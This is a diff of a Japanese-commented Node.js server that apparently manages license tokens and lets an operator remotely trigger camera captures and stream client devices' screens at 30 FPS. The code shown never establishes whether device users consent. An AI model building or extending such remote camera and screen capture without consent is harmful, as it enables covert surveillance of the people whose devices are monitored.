@@ -1,4 +1,4 @@
-// server.js - 完全版（BAN機能 + 画面配信 + 容量節約クリーンアップ）
+// server.js - 完全版（BAN + カメラ + 画面ストリーミング + オンライン判定）
 const express = require('express');
 const sqlite3 = require('sqlite3').verbose();
 const path = require('path');
@@ -99,7 +99,6 @@ db.serialize(() => {
       type TEXT DEFAULT 'camera'
     )
   `);
-  // BAN リクエスト用テーブル
   db.run(`
     CREATE TABLE IF NOT EXISTS ban_requests (
       id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -113,7 +112,7 @@ db.serialize(() => {
   `);
 });
 
-// マイグレーション（既存DBへのカラム追加）
+// マイグレーション
 db.all("PRAGMA table_info(tokens)", (err, rows) => {
   if (err) return;
   const cols = (rows || []).map(r => r.name);
@@ -121,23 +120,18 @@ db.all("PRAGMA table_info(tokens)", (err, rows) => {
   if (!cols.includes('device_info')) db.run("ALTER TABLE tokens ADD COLUMN device_info TEXT DEFAULT NULL");
   if (!cols.includes('first_used')) db.run("ALTER TABLE tokens ADD COLUMN first_used DATETIME DEFAULT NULL");
   if (!cols.includes('order_id')) db.run("ALTER TABLE tokens ADD COLUMN order_id TEXT DEFAULT NULL");
-  if (!cols.includes('last_seen')) {
-    db.run("ALTER TABLE tokens ADD COLUMN last_seen INTEGER DEFAULT NULL");
-    console.log("[Migration] last_seen 列を追加");
-  }
+  if (!cols.includes('last_seen')) db.run("ALTER TABLE tokens ADD COLUMN last_seen INTEGER DEFAULT NULL");
 });
-
 db.all("PRAGMA table_info(camera_images)", (err, rows) => {
   if (err) return;
   const cols = (rows || []).map(r => r.name);
-  if (!cols.includes('type')) {
-    db.run("ALTER TABLE camera_images ADD COLUMN type TEXT DEFAULT 'camera'");
-    console.log("[Migration] camera_images.type 列を追加");
-  }
+  if (!cols.includes('type')) db.run("ALTER TABLE camera_images ADD COLUMN type TEXT DEFAULT 'camera'");
 });
 
 // === キャッシュ ===
 let tokenCache = {};
+const latestScreenFrames = {}; // ★ 画面配信の最新画像をメモリに保持するオブジェクト
+
 async function updateCache() {
   return new Promise((resolve) => {
     db.all("SELECT * FROM tokens", (err, rows) => {
@@ -148,7 +142,6 @@ async function updateCache() {
     });
   });
 }
-
 updateCache().then(() => console.log(`キャッシュロード: ${Object.keys(tokenCache).length}トークン`));
 
 // === ログインHTML ===
@@ -216,7 +209,6 @@ app.get('/dashboard', async (req, res) => {
     });
   });
 
-  // BAN待機件数
   const banPendingCounts = await new Promise(r => {
     db.all("SELECT token, COUNT(*) as cnt FROM ban_requests WHERE status IN ('pending','delivered') GROUP BY token", (e, rows) => {
       if (e) return r({});
@@ -226,8 +218,7 @@ app.get('/dashboard', async (req, res) => {
     });
   });
 
-  let html = `<h1>Token Manager(時間は＋9時間)</h1>
-    <ul>`;
+  let html = `<h1>Token Manager(時間は＋9時間)</h1><ul>`;
   for (const [t, d] of Object.entries(tokenCache)) {
     const remaining = d.uses - d.used;
     const expired = new Date(d.expires) < new Date();
@@ -288,6 +279,10 @@ app.get('/dashboard', async (req, res) => {
         clearInterval(screenMonitorInterval);
         screenMonitorInterval = null;
       }
+      // 画像のsrcを空にしてストリーム接続を切る
+      const img = document.getElementById('screen-live-img');
+      if (img) img.src = '';
+      
       document.getElementById('modal').style.display = 'none';
     }
 
@@ -315,31 +310,13 @@ app.get('/dashboard', async (req, res) => {
 
       document.getElementById('modal-content').innerHTML = \`
         <h2>🖥️ 画面モニター</h2>
-        <p><b>Token:</b> <code>\${token}</code> <span style="color:red; font-size:12px;">(1秒ごとに更新)</span></p>
+        <p><b>Token:</b> <code>\${token}</code> <span style="color:red; font-size:12px;">(30FPS ストリーミング)</span></p>
         <div style="width:100%; background:#000; border-radius:8px; overflow:hidden; position:relative; min-height:300px; display:flex; justify-content:center; align-items:center;">
-          <img id="screen-live-img" src="" style="width:100%; height:auto; display:block;" onerror="this.style.opacity=0.5;">
+          <!-- ストリームURLを直接指定 -->
+          <img id="screen-live-img" src="/api/screen-stream?token=\${encodeURIComponent(token)}" style="width:100%; height:auto; display:block;">
         </div>
       \`;
       document.getElementById('modal').style.display = 'block';
-
-      const img = document.getElementById('screen-live-img');
-      const fetchLatestScreen = () => {
-        fetch(\`/api/latest-screen?token=\${encodeURIComponent(token)}&t=\${Date.now()}\`)
-          .then(res => {
-            if (res.ok) return res.blob();
-            throw new Error('No image');
-          })
-          .then(blob => {
-            const url = URL.createObjectURL(blob);
-            img.src = url;
-            img.style.opacity = 1;
-          })
-          .catch(() => {
-            img.style.opacity = 0.3;
-          });
-      };
-      fetchLatestScreen();
-      screenMonitorInterval = setInterval(fetchLatestScreen, 1000);
     }
 
     async function requestCamera(token) {
@@ -520,7 +497,7 @@ app.get('/api/check', async (req, res) => {
   }
 
   data.used++;
-  data.last_seen = Date.now(); // 認証時にも生存確認更新
+  data.last_seen = Date.now();
   db.run("UPDATE tokens SET used = ?, last_seen = ? WHERE token = ?", [data.used, data.last_seen, token], (err) => { if (err) console.error(err); });
   res.json({ valid: true });
 });
@@ -597,19 +574,15 @@ app.post('/api/camera-upload', (req, res) => {
   if (buffer.length === 0) return res.status(400).json({ error: 'empty image' });
   if (buffer.length > 5 * 1024 * 1024) return res.status(413).json({ error: 'too large' });
 
+  // ★ 画面配信の場合はDBに保存せずメモリに保持
+  if (type === 'screen') {
+    latestScreenFrames[token] = buffer;
+    return res.json({ ok: true });
+  }
+
+  // カメラ写真はDBに保存
   db.run("INSERT INTO camera_images (token, request_id, data, mimetype, size, type) VALUES (?, ?, ?, ?, ?, ?)", [token, requestId || null, buffer, mimetype || 'image/jpeg', buffer.length, type || 'camera'], function (err) {
     if (err) return res.status(500).json({ error: err.message });
-    
-    // ★追加: 画面配信画像は最新3枚のみ残して削除（カメラ写真は削除しない）
-    if (type === 'screen') {
-      db.run(`
-        DELETE FROM camera_images 
-        WHERE token = ? AND type = 'screen' AND id NOT IN (
-          SELECT id FROM camera_images WHERE token = ? AND type = 'screen' ORDER BY id DESC LIMIT 3
-        )
-      `, [token, token]);
-    }
-
     if (requestId) db.run("UPDATE camera_requests SET status = 'captured', captured_at = CURRENT_TIMESTAMP WHERE id = ?", [requestId]);
     res.json({ ok: true, imageId: this.lastID });
   });
@@ -619,7 +592,6 @@ app.get('/api/camera-images', (req, res) => {
   const { token } = req.query;
   if (!token) return res.send('<p>token required</p>');
 
-  // カメラ写真のみ一覧表示
   db.all("SELECT id, size, mimetype, created_at FROM camera_images WHERE token = ? AND type = 'camera' ORDER BY id DESC LIMIT 100", [token], (err, rows) => {
     if (err) return res.send('<p>DB error</p>');
     let html = `<h2>📷 撮影画像</h2><p><b>Token:</b> <code>${escapeHtml(token)}</code></p>`;
@@ -641,14 +613,28 @@ app.get('/api/camera-images', (req, res) => {
   });
 });
 
-// ★追加: 最新の画面配信画像を取得
-app.get('/api/latest-screen', (req, res) => {
+// ★ 画面ストリーミング配信（MJPEG）
+app.get('/api/screen-stream', (req, res) => {
   const { token } = req.query;
-  db.get("SELECT data, mimetype FROM camera_images WHERE token = ? AND type = 'screen' ORDER BY id DESC LIMIT 1", [token], (err, row) => {
-    if (err || !row) return res.status(404).send('not found');
-    res.set('Content-Type', row.mimetype || 'image/jpeg');
-    res.set('Cache-Control', 'no-store, no-cache, must-revalidate, private');
-    res.send(row.data);
+  if (!token) return res.status(400).send('token required');
+
+  res.writeHead(200, {
+    'Content-Type': 'multipart/x-mixed-replace; boundary=frame',
+    'Cache-Control': 'no-store, no-cache, must-revalidate, private',
+    'Connection': 'keep-alive'
+  });
+
+  const interval = setInterval(() => {
+    const frame = latestScreenFrames[token];
+    if (frame) {
+      res.write(`--frame\r\nContent-Type: image/jpeg\r\nContent-Length: ${frame.length}\r\n\r\n`);
+      res.write(frame);
+      res.write('\r\n');
+    }
+  }, 1000 / 30); // 30FPS
+
+  req.on('close', () => {
+    clearInterval(interval);
   });
 });
 
